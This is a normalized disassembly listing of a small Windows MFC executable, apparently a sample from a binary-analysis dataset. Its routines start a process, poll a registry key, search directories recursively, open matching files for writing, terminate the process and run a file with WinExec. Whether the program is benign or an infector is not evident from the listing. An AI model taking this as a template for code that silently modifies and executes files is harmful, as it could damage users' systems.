sub_4010d0
push 0xffffffff
push sub_401e0d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x184
push ebx
push esi
mov esi ecx
push edi
push rw-data
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_537
push 0x2f
lea ecx [ esp + 0x10 ]
mov [ esp + 0x19c ] 0x0
call Ordinal_MFC42_5683
mov ecx [ esp + 0xc ]
inc eax
lea edx [ esp + 0x24 ]
mov ecx [ ecx - 0x8 ]
push ecx
push eax
push edx
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_4278
mov ebx 0x1
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0x19c ] bl
call Ordinal_MFC42_858
lea ecx [ esp + 0x24 ]
mov [ esp + 0x198 ] 0x0
call Ordinal_MFC42_800
push 0x2e
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_5683
cmp eax 0xffffffff
jne r-xdata
push rw-data
push eax
lea ecx [ esp + 0x14 ]
mov [ esi + 0xc4 ] bl
call Ordinal_MFC42_6779
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esi + 0xc4 ] 0x0
call Ordinal_MFC42_941
jmp r-xdata
xor edi edi
lea eax [ esp + 0x28 ]
lea ecx [ esp + 0x8c ]
push eax
mov eax [ esp + 0x20 ]
lea edx [ esp + 0x38 ]
push ecx
push edx
push 0x0
push rw-data
push eax
mov [ esp + 0x40 ] 0x104
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_540
push 0x104
push 0x104
lea ecx [ esp + 0x18 ]
mov [ esp + 0x1a0 ] 0x2
call Ordinal_MFC42_2915
push eax
call [ GetSystemDirectoryA@IAT ]
push 0xffffffff
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_5572
lea eax [ esp + 0x10 ]
push rw-data
lea ecx [ esp + 0x24 ]
push eax
push ecx
call Ordinal_MFC42_924
push rw-data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x19c ] 0x3
call Ordinal_MFC42_537
push rw-data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x19c ] 0x4
call Ordinal_MFC42_941
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x48 ]
lea edx [ esp + 0x38 ]
[ edi ]
mov [ esp + 0x78 ] ax
lea eax [ esp + 0x48 ]
push edx
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x3c ]
mov [ esp + 0x6c ] 0x44
mov [ esp + 0x98 ] ebx
call Ordinal_MFC42_2915
push eax
push 0x0
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_2915
push eax
call [ CreateProcessA@IAT ]
mov ecx [ esp + 0x38 ]
mov [ esi + 0xc8 ] ecx
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_540
lea edx [ esp + 0x1c ]
mov bl 0x5
push edx
push 0x20019
push 0x0
push rw-data
push 0x80000001
mov [ esp + 0x1ac ] bl
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0xc8 ]
push 0x0
push eax
call [ TerminateProcess@IAT ]
lea ecx [ esp + 0x14 ]
mov [ esp + 0x198 ] 0x4
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0x198 ] 0x3
call Ordinal_MFC42_800
lea ecx [ esp + 0x20 ]
mov [ esp + 0x198 ] 0x2
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0x198 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0xc ]
mov [ esp + 0x198 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x190 ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x190
retn
mov edx edi
inc edi
cmp edx 0x258
jg r-xdata
mov eax [ esp + 0x1c ]
push eax
call [ RegCloseKey@IAT ]
lea ecx [ esp + 0x8c ]
lea edx [ esp + 0x14 ]
push ecx
push rw-data
push edx
call Ordinal_MFC42_2818
add esp 0xc
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push ecx
lea edx [ esp + 0x10 ]
mov ecx esp
mov [ esp + 0x34 ] esp
push edx
call Ordinal_MFC42_535
push ecx
lea ecx [ esp + 0x1c ]
mov eax esp
mov [ esp + 0x34 ] esp
push rw-data
push ecx
push eax
mov [ esp + 0x1ac ] 0x6
call Ordinal_MFC42_924
mov ecx esi
mov [ esp + 0x1a0 ] bl
call sub_4013d0
test al al
jne r-xdata
sub_4013d0
push 0xffffffff
push sub_401e67
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x150
push ebx
push ebp
push esi
push edi
mov ebp ecx
lea ecx [ esp + 0x10 ]
mov [ esp + 0x168 ] 0x1
call Ordinal_MFC42_540
lea eax [ esp + 0x170 ]
push rw-data
lea ecx [ esp + 0x18 ]
push eax
push ecx
mov [ esp + 0x174 ] 0x2
call Ordinal_MFC42_924
mov eax [ eax ]
lea edx [ esp + 0x20 ]
push edx
push eax
call [ FindFirstFileA@IAT ]
lea ecx [ esp + 0x14 ]
mov edi eax
call Ordinal_MFC42_800
or ebx 0xffffffff
cmp edi ebx
je r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x168 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x170 ]
mov [ esp + 0x168 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x174 ]
mov [ esp + 0x168 ] ebx
call Ordinal_MFC42_800
xor al al
test [ esp + 0x20 ] 0x10
je r-xdata
lea ecx [ esp + 0x4c ]
push ecx
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_860
mov al [ ebp + 0xc4 ]
test al al
je r-xdata
mov esi rw-data
lea eax [ esp + 0x4c ]
mov ecx [ esp + 0x174 ]
push ecx
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_2764
test eax eax
setge al
mov edx [ esp + 0x174 ]
mov eax [ esp + 0x10 ]
push edx
push eax
call [ _mbscmp@IAT ]
add esp 0x8
test eax eax
sete al
jmp r-xdata
sbb eax eax
sbb eax ebx
test cl cl
je r-xdata
lea eax [ esp + 0x170 ]
push rw-data
lea ecx [ esp + 0x1c ]
push eax
push ecx
call Ordinal_MFC42_924
lea edx [ esp + 0x4c ]
mov [ esp + 0x168 ] 0x6
push edx
push eax
lea eax [ esp + 0x1c ]
push eax
call Ordinal_MFC42_924
lea ecx [ esp + 0x18 ]
mov [ esp + 0x168 ] 0x8
call Ordinal_MFC42_800
mov esi [ CreateFileA@IAT ]
lea edx [ esp + 0x20 ]
push edx
test al al
jne r-xdata
lea eax [ esp + 0x20 ]
push eax
jmp r-xdata
mov esi rw-data
lea eax [ esp + 0x4c ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov edx [ ebp + 0xc8 ]
push 0x0
push edx
call [ TerminateProcess@IAT ]
mov eax [ esp + 0x14 ]
push 0x1
push eax
call [ WinExec@IAT ]
cmp eax 0x20
mov [ esp + 0x168 ] 0x2
lea ecx [ esp + 0x14 ]
jae r-xdata
jmp r-xdata
push edi
call [ FindClose@IAT ]
jmp r-xdata
push edi
call [ FindNextFileA@IAT ]
test eax eax
setne al
test al al
je r-xdata
sbb eax eax
sbb eax ebx
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0x168 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x170 ]
mov [ esp + 0x168 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x174 ]
mov [ esp + 0x168 ] ebx
call Ordinal_MFC42_800
mov al 0x1
jmp r-xdata
call Ordinal_MFC42_800
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x40000000
push ecx
call esi
cmp eax ebx
jne r-xdata
push ecx
lea eax [ esp + 0x178 ]
mov ecx esp
mov [ esp + 0x1c ] esp
push eax
call Ordinal_MFC42_535
lea ecx [ esp + 0x174 ]
push rw-data
lea edx [ esp + 0x1c ]
push ecx
push edx
mov [ esp + 0x178 ] 0x3
call Ordinal_MFC42_924
push ecx
lea edx [ esp + 0x54 ]
mov ecx esp
mov [ esp + 0x24 ] esp
push edx
push eax
push ecx
mov [ esp + 0x17c ] 0x4
call Ordinal_MFC42_924
mov ecx ebp
mov [ esp + 0x170 ] 0x5
call sub_4013d0
lea ecx [ esp + 0x14 ]
mov bl al
mov [ esp + 0x168 ] 0x2
call Ordinal_MFC42_800
test bl bl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov ecx [ esp + 0x160 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x15c
retn 0x8
lea ecx [ esp + 0x10 ]
mov [ esp + 0x168 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x170 ]
mov [ esp + 0x168 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x174 ]
mov [ esp + 0x168 ] 0xffffffff
call Ordinal_MFC42_800
mov al bl
jmp r-xdata
or ebx 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_4017e0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_401e88
push eax
mov eax [ esp + 0x10 ]
mov [ fs : 0x0 ] esp
and eax 0xfff0
sub esp 0x60
cmp eax 0x10
jne r-xdata
call Ordinal_MFC42_2379
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x8
lea ecx [ esp ]
call sub_401760
lea ecx [ esp ]
mov [ esp + 0x68 ] 0x0
call Ordinal_MFC42_2514
lea ecx [ esp ]
mov [ esp + 0x68 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x8
sub_401860
sub esp 0x64
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push eax
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov ecx esi
call Ordinal_MFC42_2379
pop esi
add esp 0x64
retn
push ebx
push edi
push esi
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_470
mov edi [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
mov ecx [ esi + 0x20 ]
push 0x0
neg eax
sbb eax eax
and eax edi
push eax
push 0x27
push ecx
call [ SendMessageA@IAT ]
mov edi [ GetSystemMetrics@IAT ]
push 0xb
call edi
push 0xc
mov ebx eax
call edi
mov edi eax
mov eax [ esi + 0x20 ]
lea edx [ esp + 0xc ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0x60 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
sub eax ecx
sub eax edi
inc eax
cdq
sub eax edx
mov edx [ esp + 0x10 ]
sar eax 0x1
push eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax ebx
inc eax
cdq
sub eax edx
mov edx [ esp + 0x28 ]
sar eax 0x1
push eax
push edx
call [ DrawIcon@IAT ]
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_755
pop edi
pop ebx
pop esi
add esp 0x64
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401d55
cmp [ rw-data ] ebx
jne r-xdata
call sub_401d40
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401d52
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401d62
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401d7a
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401000
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_401010
mov eax r--data
retn
sub_401020
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401040
push esi
mov esi ecx
call sub_401060
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401060
jmp Ordinal_MFC42_815
sub_401070
call sub_401080
jmp sub_401090
sub_401080
mov ecx rw-data
jmp sub_401020
sub_401090
push sub_4010a0
call sub_401baa
pop ecx
retn
sub_4010a0
mov ecx rw-data
jmp sub_401060
sub_4010b0
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_1134
add esp 0x4
mov ecx esi
call sub_4010d0
xor eax eax
pop esi
retn
sub_401740
retn 0x4
sub_401750
retn
sub_401760
push esi
push 0x0
mov esi ecx
push 0x64
call Ordinal_MFC42_324
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401780
push esi
mov esi ecx
call sub_4017a0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4017a0
jmp Ordinal_MFC42_641
sub_4017b0
retn 0x4
sub_4017c0
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_4017d0
mov eax r--data
retn
sub_401920
mov eax [ ecx + 0x60 ]
retn
sub_401930
mov eax [ ecx + 0x20 ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_401940
mov eax [ ecx + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
Ordinal_MFC42_4673
jmp [ Ordinal_MFC42_4673@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
Ordinal_MFC42_535
jmp [ Ordinal_MFC42_535@IAT ]
Ordinal_MFC42_2818
jmp [ Ordinal_MFC42_2818@IAT ]
Ordinal_MFC42_924
jmp [ Ordinal_MFC42_924@IAT ]
Ordinal_MFC42_5572
jmp [ Ordinal_MFC42_5572@IAT ]
Ordinal_MFC42_2915
jmp [ Ordinal_MFC42_2915@IAT ]
Ordinal_MFC42_540
jmp [ Ordinal_MFC42_540@IAT ]
Ordinal_MFC42_6779
jmp [ Ordinal_MFC42_6779@IAT ]
Ordinal_MFC42_941
jmp [ Ordinal_MFC42_941@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_858
jmp [ Ordinal_MFC42_858@IAT ]
Ordinal_MFC42_4278
jmp [ Ordinal_MFC42_4278@IAT ]
Ordinal_MFC42_5683
jmp [ Ordinal_MFC42_5683@IAT ]
Ordinal_MFC42_537
jmp [ Ordinal_MFC42_537@IAT ]
Ordinal_MFC42_2764
jmp [ Ordinal_MFC42_2764@IAT ]
Ordinal_MFC42_860
jmp [ Ordinal_MFC42_860@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
Ordinal_MFC42_2379
jmp [ Ordinal_MFC42_2379@IAT ]
Ordinal_MFC42_755
jmp [ Ordinal_MFC42_755@IAT ]
Ordinal_MFC42_470
jmp [ Ordinal_MFC42_470@IAT ]
sub_401b7e
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_401baa
push [ esp + 0x4 ]
call sub_401b7e
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401d40
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401d52
xor eax eax
retn
sub_401d55
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_401d62
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_401da8
jmp sub_401da8
sub_401da8
push 0x600
push 0x0
call sub_401d7a
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
sub_401dc0
lea ecx [ ebp - 0x190 ]
jmp Ordinal_MFC42_800
sub_401dcb
lea ecx [ ebp - 0x178 ]
jmp Ordinal_MFC42_800
sub_401dd6
lea ecx [ ebp - 0x18c ]
jmp Ordinal_MFC42_800
sub_401de1
lea ecx [ ebp - 0x17c ]
jmp Ordinal_MFC42_800
sub_401dec
lea ecx [ ebp - 0x184 ]
jmp Ordinal_MFC42_800
sub_401df7
lea ecx [ ebp - 0x188 ]
jmp Ordinal_MFC42_800
sub_401e02
mov ecx [ ebp - 0x16c ]
jmp Ordinal_MFC42_800
sub_401e0d
mov eax r--data
jmp __CxxFrameHandler
sub_401e20
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_401e28
lea ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_401e30
lea ecx [ ebp - 0x15c ]
jmp Ordinal_MFC42_800
sub_401e3b
mov ecx [ ebp - 0x154 ]
jmp Ordinal_MFC42_800
sub_401e46
lea ecx [ ebp - 0x158 ]
jmp Ordinal_MFC42_800
sub_401e51
lea ecx [ ebp - 0x154 ]
jmp Ordinal_MFC42_800
sub_401e5c
lea ecx [ ebp - 0x158 ]
jmp Ordinal_MFC42_800
sub_401e67
mov eax r--data
jmp __CxxFrameHandler
sub_401e80
lea ecx [ ebp - 0x6c ]
jmp sub_4017a0
sub_401e88
mov eax r--data
jmp __CxxFrameHandler
